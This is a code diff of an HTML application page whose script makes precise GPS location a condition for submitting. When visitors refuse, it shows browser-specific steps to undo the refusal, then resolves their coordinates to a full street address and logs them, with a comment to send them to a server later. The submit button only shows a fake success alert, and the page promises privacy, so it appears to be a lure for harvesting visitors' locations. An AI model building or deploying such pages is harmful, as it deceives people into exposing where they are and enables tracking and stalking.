-      <p class="form-note">🔒 Your information is secured with 256-bit SSL encryption. We do not sell or share personal data.</p>
+
+      <!-- SUBMIT — disabled until location verified -->
+      <button id="submit-btn" class="form-submit" disabled onclick="handleSubmit(event)">
+        🔒 Verify Location to Submit Application
+      </button>
+      <p class="submit-hint" id="submit-hint">Location verification is required before submitting.</p>
+      <p class="form-note">Your information is secured with 256-bit SSL encryption. We do not sell or share personal data.</p>
     </div>
   </div>
 </section>
@@ -451,181 +473,226 @@
 </footer>
 
 <script>
-  var locationCaptured = false;
+var locationCaptured = false;
+var capturedAddress   = '';
+var capturedLat       = null;
+var capturedLon       = null;
 
-  // Detect browser for step instructions
-  function getBrowser() {
-    var ua = navigator.userAgent;
-    if (/iPhone|iPad|iPod/.test(ua)) return 'ios';
-    if (/Android/.test(ua)) return 'android';
-    if (/Firefox/.test(ua)) return 'firefox';
-    if (/Edg/.test(ua)) return 'edge';
-    if (/Chrome/.test(ua)) return 'chrome';
-    if (/Safari/.test(ua)) return 'safari';
-    return 'chrome';
+/* ── BROWSER DETECTION ── */
+function getBrowser(){
+  var ua=navigator.userAgent;
+  if(/iPhone|iPad|iPod/.test(ua))return'ios';
+  if(/Android/.test(ua))return'android';
+  if(/Firefox/.test(ua))return'firefox';
+  if(/Edg/.test(ua))return'edge';
+  if(/Chrome/.test(ua))return'chrome';
+  if(/Safari/.test(ua))return'safari';
+  return'chrome';
+}
+function getDeniedSteps(){
+  var b=getBrowser();
+  if(b==='chrome')return[
+    'Click the 🔒 <strong>lock icon</strong> in your browser address bar.',
+    'Click <strong>Site settings</strong>.',
+    'Find <strong>Location</strong> → change it to <strong>Allow</strong>.',
+    'Refresh this page, then click Allow Location again.'
+  ];
+  if(b==='firefox')return[
+    'Click the 🔒 <strong>lock icon</strong> in the address bar.',
+    'Click the arrow next to <strong>Connection Secure</strong>.',
+    'Click <strong>More Information</strong> → open the <strong>Permissions</strong> tab.',
+    'Find <strong>Access Your Location</strong> → set to <strong>Allow</strong>.',
+    'Refresh this page and try again.'
+  ];
+  if(b==='safari')return[
+    'In the menu bar go to <strong>Safari → Settings for This Website</strong>.',
+    'Set <strong>Location</strong> to <strong>Allow</strong>.',
+    'Refresh and try again.'
+  ];
+  if(b==='edge')return[
+    'Click the 🔒 <strong>lock icon</strong> in the address bar.',
+    'Click <strong>Permissions for this site</strong>.',
+    'Set <strong>Location</strong> to <strong>Allow</strong>.',
+    'Refresh and try again.'
+  ];
+  if(b==='ios')return[
+    'Open <strong>Settings</strong> on your iPhone/iPad.',
+    'Scroll down and tap <strong>Safari</strong> (or your browser app).',
+    'Tap <strong>Location</strong> → select <strong>Allow</strong>.',
+    'Return to this page and try again.'
+  ];
+  if(b==='android')return[
+    'Tap the 🔒 <strong>lock icon</strong> in your browser address bar.',
+    'Tap <strong>Permissions</strong> → <strong>Location</strong>.',
+    'Select <strong>Allow</strong>.',
+    'Refresh and try again.'
+  ];
+  return[
+    'Open your browser settings → Site Permissions → Location.',
+    'Allow location for this site, then refresh and try again.'
+  ];
+}
+
+/* ── OPEN MODAL ── */
+function openLocationModal(e){
+  if(e) e.preventDefault();
+  if(locationCaptured){
+    document.getElementById('apply').scrollIntoView({behavior:'smooth'});
+    return;
+  }
+  document.getElementById('loc-overlay').classList.add('active');
+}
+
+/* ── SUBMIT BUTTON CLICK — pops modal if not yet verified ── */
+function handleSubmit(e){
+  if(!locationCaptured){
+    e.preventDefault();
+    openLocationModal(e);
+  } else {
+    alert('Application submitted successfully! You will receive a confirmation email within 24 hours.');
+  }
+}
+
+/* ── CLOSE MODAL & SCROLL TO FORM ── */
+function closeModalAndProceed(){
+  document.getElementById('loc-overlay').classList.remove('active');
+  setTimeout(function(){
+    document.getElementById('apply').scrollIntoView({behavior:'smooth'});
+  },300);
+}
+
+/* ── STATUS MESSAGE ── */
+function setStatus(msg,cls){
+  var el=document.getElementById('loc-modal-status');
+  el.innerHTML=msg;
+  el.className=cls||'';
+}
+
+/* ── UNLOCK FORM AFTER VERIFIED ── */
+function unlockForm(address,lat,lon){
+  var btn=document.getElementById('submit-btn');
+  btn.disabled=false;
+  btn.textContent='Submit Application →';
+
+  var hint=document.getElementById('submit-hint');
+  hint.style.display='none';
+
+  var badge=document.getElementById('loc-verified-badge');
+  badge.style.display='block';
+  document.getElementById('badge-address').textContent=address;
+}
+
+/* ── MAIN LOCATION FUNCTION ── */
+function startLocation(){
+  var btn=document.getElementById('loc-modal-btn');
+  var deniedBox=document.getElementById('denied-box');
+  var retryBtn=document.getElementById('retry-btn');
+  var addrBox=document.getElementById('modal-address-box');
+
+  // Reset UI state
+  deniedBox.style.display='none';
+  retryBtn.style.display='none';
+  addrBox.style.display='none';
+  btn.style.display='block';
+  btn.disabled=true;
+  btn.textContent='📡 Detecting your location...';
+  setStatus('Please wait — verifying your location...','status-loading');
+
+  if(!navigator.geolocation){
+    btn.disabled=false;
+    btn.textContent='Allow Location & Continue';
+    setStatus('','');
+    deniedBox.style.display='block';
+    document.getElementById('denied-steps').innerHTML='<li>Your browser does not support geolocation. Please try Google Chrome or Firefox.</li>';
+    return;
   }
 
-  function getDeniedSteps() {
-    var b = getBrowser();
-    if (b === 'chrome') return [
-      'Click the 🔒 lock icon in the address bar at the top of your browser.',
-      'Click <strong>Site settings</strong>.',
-      'Find <strong>Location</strong> and change it to <strong>Allow</strong>.',
-      'Refresh this page and click Allow Location again.'
-    ];
-    if (b === 'firefox') return [
-      'Click the 🔒 lock icon in the address bar.',
-      'Click the arrow next to <strong>Connection Secure</strong>.',
-      'Click <strong>More Information</strong> → <strong>Permissions</strong> tab.',
-      'Find <strong>Access Your Location</strong> and set it to <strong>Allow</strong>.',
-      'Refresh this page and try again.'
-    ];
-    if (b === 'safari') return [
-      'Go to <strong>Safari → Settings for This Website</strong> in the menu bar.',
-      'Set <strong>Location</strong> to <strong>Allow</strong>.',
-      'Refresh and try again.'
-    ];
-    if (b === 'edge') return [
-      'Click the 🔒 lock icon in the address bar.',
-      'Click <strong>Permissions for this site</strong>.',
-      'Set <strong>Location</strong> to <strong>Allow</strong>.',
-      'Refresh and try again.'
-    ];
-    if (b === 'ios') return [
-      'Open <strong>Settings</strong> on your iPhone/iPad.',
-      'Scroll down and tap <strong>Safari</strong> (or your browser).',
-      'Tap <strong>Location</strong> → select <strong>Allow</strong>.',
-      'Return to this page and try again.'
-    ];
-    if (b === 'android') return [
-      'Tap the 🔒 lock icon in your browser address bar.',
-      'Tap <strong>Permissions</strong> → <strong>Location</strong>.',
-      'Select <strong>Allow</strong>.',
-      'Refresh and try again.'
-    ];
-    return [
-      'Open your browser settings.',
-      'Find Site Permissions → Location.',
-      'Allow location for this site.',
-      'Refresh and try again.'
-    ];
-  }
+  navigator.geolocation.getCurrentPosition(
+    /* ── SUCCESS ── */
+    function(position){
+      capturedLat=position.coords.latitude;
+      capturedLon=position.coords.longitude;
+      var accuracy=Math.round(position.coords.accuracy);
 
-  function openLocationModal(e) {
-    if (e) e.preventDefault();
-    if (locationCaptured) {
-      // Already have location, go straight to form
-      document.getElementById('apply').scrollIntoView({behavior:'smooth'});
-      return;
-    }
-    document.getElementById('loc-overlay').classList.add('active');
-  }
+      setStatus('📍 GPS detected! Fetching your full address...','status-loading');
 
-  function closeModalAndProceed() {
-    document.getElementById('loc-overlay').classList.remove('active');
-    setTimeout(function(){
-      document.getElementById('apply').scrollIntoView({behavior:'smooth'});
-    }, 300);
-  }
+      fetch('https://nominatim.openstreetmap.org/reverse?lat='+capturedLat+'&lon='+capturedLon+'&format=json&addressdetails=1')
+        .then(function(r){return r.json();})
+        .then(function(data){
+          capturedAddress = data.display_name || (capturedLat.toFixed(6)+', '+capturedLon.toFixed(6));
 
-  function setStatus(msg, cls) {
-    var el = document.getElementById('loc-modal-status');
-    el.textContent = msg;
-    el.className = cls || '';
-  }
+          // Show address inside modal
+          document.getElementById('modal-addr-text').textContent = capturedAddress;
+          document.getElementById('modal-addr-coords').textContent =
+            'Lat: '+capturedLat.toFixed(6)+' | Lon: '+capturedLon.toFixed(6)+' | Accuracy: ~'+accuracy+'m';
+          document.getElementById('modal-address-box').style.display='block';
 
-  function startLocation() {
-    var btn = document.getElementById('loc-modal-btn');
-    var deniedBox = document.getElementById('denied-box');
-    var retryBtn = document.getElementById('retry-btn');
+          locationCaptured=true;
 
-    // Reset UI
-    deniedBox.style.display = 'none';
-    retryBtn.style.display = 'none';
-    btn.style.display = 'block';
-    btn.disabled = true;
-    btn.textContent = '📡 Detecting your location...';
-    setStatus('Please wait — verifying your location...', 'status-loading');
+          // Console log (replace with server fetch in production)
+          console.log('=== VISITOR LOCATION CAPTURED ===');
+          console.log('Full Address : ', capturedAddress);
+          console.log('Latitude     : ', capturedLat);
+          console.log('Longitude    : ', capturedLon);
+          console.log('Accuracy     : ', accuracy+' meters');
+          console.log('Timestamp    : ', new Date().toISOString());
 
-    if (!navigator.geolocation) {
-      btn.disabled = false;
-      btn.textContent = 'Allow Location & Continue';
-      setStatus('', '');
-      deniedBox.style.display = 'block';
-      document.getElementById('denied-steps').innerHTML = '<li>Your browser does not support location services. Please try Chrome or Firefox.</li>';
-      return;
-    }
+          btn.textContent='✅ Verified — Proceeding to Application...';
+          setStatus('✅ Location confirmed successfully!','status-success');
 
-    navigator.geolocation.getCurrentPosition(
-      function(position) {
-        var lat = position.coords.latitude;
-        var lon = position.coords.longitude;
-        var accuracy = Math.round(position.coords.accuracy);
+          unlockForm(capturedAddress, capturedLat, capturedLon);
 
-        setStatus('📍 Location detected! Fetching address...', 'status-loading');
+          setTimeout(function(){closeModalAndProceed();},2200);
+        })
+        .catch(function(){
+          // Geocode API failed — still have coordinates
+          capturedAddress = capturedLat.toFixed(6)+', '+capturedLon.toFixed(6);
 
-        // Reverse geocode — free, no key needed
-        fetch('https://nominatim.openstreetmap.org/reverse?lat=' + lat + '&lon=' + lon + '&format=json')
-          .then(function(r){ return r.json(); })
-          .then(function(data) {
-            var address = data.display_name || (lat.toFixed(5) + ', ' + lon.toFixed(5));
-            locationCaptured = true;
+          document.getElementById('modal-addr-text').textContent='Coordinates: '+capturedAddress;
+          document.getElementById('modal-addr-coords').textContent='Accuracy: ~'+accuracy+'m';
+          document.getElementById('modal-address-box').style.display='block';
 
-            // Log full details to console (replace with your server call)
-            console.log('=== VISITOR LOCATION CAPTURED ===');
-            console.log('Latitude:', lat);
-            console.log('Longitude:', lon);
-            console.log('Full Address:', address);
-            console.log('Accuracy:', accuracy + ' meters');
-            console.log('Timestamp:', new Date().toISOString());
+          locationCaptured=true;
+          console.log('=== VISITOR LOCATION CAPTURED ===');
+          console.log('Coordinates : ', capturedAddress);
+          console.log('Accuracy    : ', accuracy+' meters');
 
-            btn.textContent = '✅ Location Verified — Proceeding...';
-            setStatus('✅ Confirmed: ' + address, 'status-success');
+          btn.textContent='✅ Verified — Proceeding...';
+          setStatus('✅ Coordinates confirmed!','status-success');
+          unlockForm(capturedAddress, capturedLat, capturedLon);
+          setTimeout(function(){closeModalAndProceed();},2200);
+        });
+    },
 
-            setTimeout(function(){ closeModalAndProceed(); }, 1800);
-          })
-          .catch(function() {
-            // Geocode failed but we still have coordinates
-            locationCaptured = true;
-            console.log('=== VISITOR LOCATION CAPTURED ===');
-            console.log('Latitude:', lat);
-            console.log('Longitude:', lon);
-            console.log('Accuracy:', accuracy + ' meters');
+    /* ── ERROR ── */
+    function(error){
+      btn.disabled=false;
+      btn.textContent='Allow Location & Continue';
 
-            btn.textContent = '✅ Location Verified — Proceeding...';
-            setStatus('✅ Coordinates confirmed: ' + lat.toFixed(5) + ', ' + lon.toFixed(5), 'status-success');
-            setTimeout(function(){ closeModalAndProceed(); }, 1800);
-          });
-      },
-      function(error) {
-        btn.disabled = false;
-        btn.textContent = 'Allow Location & Continue';
-
-        if (error.code === 1) {
-          // PERMISSION_DENIED — show browser-specific fix instructions
-          setStatus('⚠️ Location access was blocked. Follow the steps below to enable it:', 'status-denied');
-          var steps = getDeniedSteps();
-          var ol = document.getElementById('denied-steps');
-          ol.innerHTML = '';
-          steps.forEach(function(s){
-            var li = document.createElement('li');
-            li.innerHTML = s;
-            ol.appendChild(li);
-          });
-          deniedBox.style.display = 'block';
-          retryBtn.style.display = 'block';
-        } else if (error.code === 2) {
-          setStatus('⚠️ Location signal unavailable. Please check your device GPS and try again.', 'status-denied');
-          retryBtn.style.display = 'block';
-        } else {
-          setStatus('⚠️ Request timed out. Please try again.', 'status-denied');
-          retryBtn.style.display = 'block';
-        }
-      },
-      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-    );
-  }
+      if(error.code===1){
+        // Permission denied — show browser-specific fix steps
+        setStatus('⚠️ Location access was blocked. Follow the steps below to enable it:','status-denied');
+        var steps=getDeniedSteps();
+        var ol=document.getElementById('denied-steps');
+        ol.innerHTML='';
+        steps.forEach(function(s){
+          var li=document.createElement('li');
+          li.innerHTML=s;
+          ol.appendChild(li);
+        });
+        deniedBox.style.display='block';
+        retryBtn.style.display='block';
+      } else if(error.code===2){
+        setStatus('⚠️ Location signal unavailable. Check your device GPS and try again.','status-denied');
+        retryBtn.style.display='block';
+      } else {
+        setStatus('⚠️ Request timed out. Please try again.','status-denied');
+        retryBtn.style.display='block';
+      }
+    },
+    {enableHighAccuracy:true, timeout:15000, maximumAge:0}
+  );
+}
 </script>
-
 </body>
 </html>
